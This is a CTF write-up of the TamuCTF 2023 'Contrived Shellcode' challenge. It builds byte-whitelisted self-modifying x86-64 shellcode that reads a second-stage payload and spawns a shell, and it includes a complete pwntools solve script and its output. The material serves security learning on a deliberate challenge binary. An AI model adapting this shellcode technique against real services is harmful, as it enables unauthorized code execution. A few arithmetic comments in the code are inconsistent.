# Contrived Shellcode

This shellcode challenge was one of the *hard pwn* problems from
[TamuCTF](https://tamuctf.com/challenges). TamuCTF is a great CTF, where [our
team](https://research.fit.edu/fitsec) went all in and cleared a lot of the
``pwn`` problems. I started the second day and had to start with this harder
problem. The author leaves a fun note about the problem.

## Problem

*There's a 0% chance this has any real world application, but sometimes it's just fun to test your skills.*

Further, the author provides a [binary](chttps://github.com/tj-oconnor/ctf-
writeups/blob/main/tamu_ctf_23/contrived-shellcode/contrived-shellcode) and
the original [source code](https://github.com/tj-oconnor/ctf-
writeups/blob/main/tamu_ctf_23/contrived-shellcode/contrived-shellcode.c) for
the challenge.

## Solution

Examining the source code, we see it is a shellcode challenge where you are
restricted to only the following bytes:

```c  
unsigned char whitelist[] =
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f";  
```

This is similar to the [gelcode-2 problem](https://ctftime.org/writeup/29138)
from RedPwnCTF 21 (which was limited to only bytes 01-05.) Inspired by
[lms](https://ctftime.org/user/52568)'s solution to that particular problem, I
took a similar approach that ``adds`` a value into ``eax`` and inserts it as
the following instruction by adding eax to ``[rip]`` (which is zeroed to
0x0000000000000000.)

To illustrate how this works, let us examine the ``pop rsi`` instruction. For
``pop rsi``, we need to ``add eax`` up to ``0x5e``. However, we cant use ``add
eax, 0x5e`` since ``0x5e`` is not in our whitelist. For that reason, we need
to use multiple adds ``0xf+0xf+0xf+0xf+0xf+0xf+0x4``.

```python  
rsi_pop = asm('add al, 0xf')*6  
rsi_pop += asm('add al, 0x4')  
rsi_pop += asm('add dword ptr [rip], eax')  
```

We can test this methodology to see if this works in the debugger output.
where we see ```pop rsi``` appear after executing ``add    dword ptr [rip],
eax``.

```  
 ...  
─────────────────────────[ DISASM / x86-64 /  
 0x7f2d4dd61000    add    al, 0xf  
 0x7f2d4dd61002    add    al, 0xf  
 0x7f2d4dd61004    add    al, 0xf  
 0x7f2d4dd61006    add    al, 0xf  
 0x7f2d4dd61008    add    al, 0xf  
 0x7f2d4dd6100a    add    al, 0xf  
 0x7f2d4dd6100c    add    al, 4  
 0x7f2d4dd6100e    add    dword ptr [rip], eax  
► 0x7f2d4dd61014    pop    rsi  
```

With this approach working, we'll need to develop our shellcode for this
problem. Reading in a second stage shellcode would be the best approach since
the buffer allocates ``0x1000`` bytes of ``RWX`` memory. We can just read in a
second-stage shellcode that is not bound by the original whitelist.

```c  
unsigned char* code = mmap(NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE,
MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);  
```

To create our stage1 ``read shellcode``, we will need to set the registers to
the following:

- rax: 0 (SYS_read)  
- rdi: 0 (stdin)  
- rsi: address of RWX memory  
- rdx: large enough value to write new shellcode (past RWX up into current instruction)

Examining the state of the stack, it appears that if we ``pop rsi`` three
times, the third pop will pick up the address of the RWX memory.

```  
│────────────────────────────────────────────────────────────────────────────────────────  
│pwndbg> stack  
│00:0000│ rsp 0x7fffb1516a98 —▸ 0x560566b23295 (main+155) ◂— mov eax, 0  
│01:0008│     0x7fffb1516aa0 ◂— 0xf700000000  
│02:0010│     0x7fffb1516aa8 —▸ 0x7f2d4dd61000 ◂— add al, 0xf /*
0xf040f040f040f04 */  
```

With this knowledge, our basic shellcode might look like the following.

```  
mov rdx, 0x1fb  /* length   */  
pop rsi  
pop rsi  
pop rsi         /* RWX memory &/  
mov rdi, 0x0    /* stdin    */  
mov rax, 0x0    /* SYS_read */  
syscall         /* executes read(rdi=stdin, rsi=RWX, rdx=200) */  
```

What we need to do next is to order these by the value of the assembly
instructions. For example, ``pop rsi`` is ``0x5e`` and ``mov rdi`` is
``0xbf``. So we will need to add eax up to ``0x5e (pop rsi)``, insert the
instruction at [rip], then add eax by ``(0xbf-0x5e)`` to get ``eax=0xbf (mov
rdi)`` and insert the instruction. Note, the binary only accepts 0x100 bytes
of shellcode. So choosing the right instructions and order is important (and
where I spent most of my time refining a solution.) At one point, I [patched
the binary](https://github.com/tj-oconnor/ctf-
writeups/blob/main/tamu_ctf_23/contrived-shellcode/contrived-shellcode-patch)
to accept 0x200 bytes so that I could test my approach. Seeing it succeed on
the patched binary gave me the final push to work through and reduce the
shellcode size to 233 bytes. The final order I developed was:

```  
pop rsi (0x5e)                           /* pop 1st stack value  */  
pop rsi (0x5e)                           /* pop 2nd stack value  */  
pop rsi (0x5e)               /* sets rsi = RWX.      */  
mov rdi, 0x0    (0xbf)       /* rdi = 0x0 (stdin)    */  
mov rdx, 0x1fb  (0x1fbba)    /* rdx = 0x1fb (len)    */  
sub rax, rax    (0xc02948)   /* rax = 0x0 (SYS_read) */  
```  

Let us examine how we set the registers.

As previously mentioned, we can set rsi by adding ``0xf*6+0x4``. And then,
repeat the instruction write two more times. Notice we had to pad ``\x00``
between instructions to prevent unintended instructions.

```python  
def pop_rsi():  
   # pop rsi = 0x5e  
   # 0x5e = 0xf*6+0x4  
   rsi_pop = asm('add al, 0xf')*6  
   rsi_pop += asm('add al, 0x4')  
   rsi_pop += asm('add dword ptr [rip], eax')  
   rsi_pop += b'\x00'*1  
   rsi_pop += asm('add dword ptr [rip], eax')  
   rsi_pop += b'\x00'*1  
   rsi_pop += asm('add dword ptr [rip], eax')  
   rsi_pop += b'\x00'*1  
log.info('> (pop rsi)*3 shellcode : (%i bytes)' % len(rsi_pop))  
   return rsi_pop  
```

Next, we write ``mov rdi, 0x0`` by starting at ``eax=0x5e`` and adding up
``0x5e+0xf*6+0x7==0xbf``.

```python  
def zero_edi():  
   # mov rdi = 0xbf  
   # (0xbf=0xba+0x5)  
   edi_zero = asm('add al, 0xf')*6  
   edi_zero += asm('add al, 0x7')  
   edi_zero += asm('add dword ptr [rip], eax')  
   edi_zero += b'\x00'*5  
log.info('> (mov edi, 0x0) shellcode : (%i bytes)' % len(edi_zero))  
   return edi_zero  
```

We then repeat for ``mov edx, 0x1fb (0x1fbba)`` by adding up
eax``01fbba=0xbf+0xf0e0f+0xf*15+0xb``

```python  
def big_edx():  
   # 0:   ba fb 01 00 00          mov    edx, 0x1fb'  
   # (0x0f0fba=0xbf+0xf0e0f+0xf*15+0xb)  
   edx_big = asm('add eax, 0xf0e0f')  
   edx_big += asm('add al,0xf')*15  
   edx_big += asm('add al, 0xb')  
   edx_big += asm('add dword ptr [rip], eax')  
   edx_big += b'\x00'*5  
log.info('> (mov edx, 0x1fb) shellcode : (%i bytes)' % len(edx_big))  
   return edx_big  
```

And finally we zero out rax with ``sub rax, rax (0xc02948)`` by adding
``0xc02948=0x01fbba+0xf0f0f*11+0xb0f0f+0x0f0f*6+0x90f+0x30f+0xf*6+8``

```python  
def zero_rax():  
   # sub rax, rax  
   # 0:   48 29 c0                sub    rax, rax'  
   # 0xc02948-0x0f0fba-0xf0f0f*11-0xb0f0f-0x0f0f*6-0x90f-0x10f-0xf*6+8  
   rax_zero = asm('add eax,0x0f0f0f')*11  
   rax_zero += asm('add eax,0xb0f0f')  
   rax_zero += asm('add eax, 0x0f0f')*6  
   rax_zero += asm('add eax, 0x90f')  
   rax_zero += asm('add eax, 0x30f')  
   rax_zero += asm('add al, 0x0f')*6  
   rax_zero += asm('add al, 0x8')  
   rax_zero += asm('add dword ptr [rip], eax')  
   rax_zero += b'\x00'*3  
log.info('> sub (rax, rax) shellcode : (%i bytes)' % len(rax_zero))  
   return rax_zero  
```

The only thing we need to do next is to send our stage1 shellcode and then
read our stage2 shellcode. Note, our second stage starts writing at the
beginning our the stage1 shellcode, so we'll need to ``nop`` out the beginning
until we reach the next instruction to execute. For this reason, we pad the
front of our second stage with ``stage2 =
asm(shellcraft.nop())*(len(stage1)+0x8*5)``

```python  
log.info('Building Stage1 Shellcode.')  
stage1 = pop_rsi()  
stage1 += zero_edi()  
stage1 += big_edx()  
stage1 += zero_rax()  
stage1 += asm('syscall')

log.info('Throwing Stage 1 Shellcode (%i bytes)' % len(stage1))  
p.sendline(stage1)  
pause()

stage2 = asm(shellcraft.nop())*(len(stage1)+0x8*5)  
stage2 += asm(shellcraft.sh())  
log.info('Throwing Stage 2 Shellcode (%i bytes)' % len(stage2))  
p.sendline(stage2)

p.interactive()  
```

Testing our script against the remote server, we are excited to see it works
and get the flag.

```  
[+] Opening connection to tamuctf.com on port 443: Done  
[*] Building Stage1 Shellcode.  
[*] > (pop rsi)*3 shellcode : (35 bytes)  
[*] > (mov edi, 0x0) shellcode : (25 bytes)  
[*] > (mov edx, 0x1fb) shellcode : (48 bytes)  
[*] > (sub rax, rax) shellcode : (123 bytes)  
[*] Throwing Stage 1 Shellcode (233 bytes)  
[*] Paused (press any to continue)  
[*] Throwing Stage 2 Shellcode (321 bytes)  
[*] Switching to interactive mode  
$ cat flag.txt  
gigem{Sh3llc0d1ng_1s_FuN}  
```

Our final solve script follows:

```python  
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]  
e = context.binary = ELF(binary, checksec=False)

gs = '''  
break *$rebase(0x1293)  
continue  
'''

def start():  
   if args.GDB:  
       return gdb.debug(e.path, gdbscript=gs)  
   elif args.REMOTE:  
       return remote("tamuctf.com", 443, ssl=True, sni="contrived-shellcode")  
   else:  
       return process(e.path)

p = start()

def pop_rsi():  
   # pop rsi = 0x5e  
   # 0x5e = 0xf*6+0x4  
   rsi_pop = asm('add al, 0xf')*6  
   rsi_pop += asm('add al, 0x4')  
   rsi_pop += asm('add dword ptr [rip], eax')  
   rsi_pop += b'\x00'*1  
   rsi_pop += asm('add dword ptr [rip], eax')  
   rsi_pop += b'\x00'*1  
   rsi_pop += asm('add dword ptr [rip], eax')  
   rsi_pop += b'\x00'*1  
log.info('> (pop rsi)*3 shellcode : (%i bytes)' % len(rsi_pop))  
   return rsi_pop

def zero_edi():  
   # mov rdi = 0xbf  
   # (0xbf=0xba+0x5)  
   edi_zero = asm('add al, 0xf')*6  
   edi_zero += asm('add al, 0x7')  
   edi_zero += asm('add dword ptr [rip], eax')  
   edi_zero += b'\x00'*5  
log.info('> (mov edi, 0x0) shellcode : (%i bytes)' % len(edi_zero))  
   return edi_zero

def big_edx():  
   # 0:   ba fb 01 00 00          mov    edx, 0x1fb'  
   # (0x1fbfba=0xbf+0xf0e0f+0xf*15+0xb)  
   edx_big = asm('add eax, 0xf0e0f')  
   edx_big += asm('add al,0xf')*15  
   edx_big += asm('add al, 0xb')  
   edx_big += asm('add dword ptr [rip], eax')  
   edx_big += b'\x00'*5  
log.info('> (mov edx, 0x1fb) shellcode : (%i bytes)' % len(edx_big))  
   return edx_big

def zero_rax():  
   # sub rax, rax  
   # 0:   48 29 c0                sub    rax, rax'  
   # 0xc02948=0x1fbba+0xf0f0f*11+0xb0f0f+0x0f0f*6+0x90f+0x30f+0xf*6+8  
   rax_zero = asm('add eax,0x0f0f0f')*11  
   rax_zero += asm('add eax,0xb0f0f')  
   rax_zero += asm('add eax, 0x0f0f')*6  
   rax_zero += asm('add eax, 0x90f')  
   rax_zero += asm('add eax, 0x30f')  
   rax_zero += asm('add al, 0x0f')*6  
   rax_zero += asm('add al, 0x8')  
   rax_zero += asm('add dword ptr [rip], eax')  
   rax_zero += b'\x00'*3  
log.info('> (sub rax, rax) shellcode : (%i bytes)' % len(rax_zero))  
   return rax_zero

log.info('Building Stage1 Shellcode.')  
stage1 =  pop_rsi()  
stage1 += zero_edi()  
stage1 += big_edx()  
stage1 += zero_rax()  
stage1 += asm('syscall')

log.info('Throwing Stage 1 Shellcode (%i bytes)' % len(stage1))  
p.sendline(stage1)  
pause()

stage2 = asm(shellcraft.nop())*(len(stage1)+0x8*5)  
stage2 += asm(shellcraft.sh())  
log.info('Throwing Stage 2 Shellcode (%i bytes)' % len(stage2))  
p.sendline(stage2)

p.interactive()  
```

Original writeup (https://github.com/tj-oconnor/ctf-
writeups/tree/main/tamu_ctf_23/contrived-shellcode).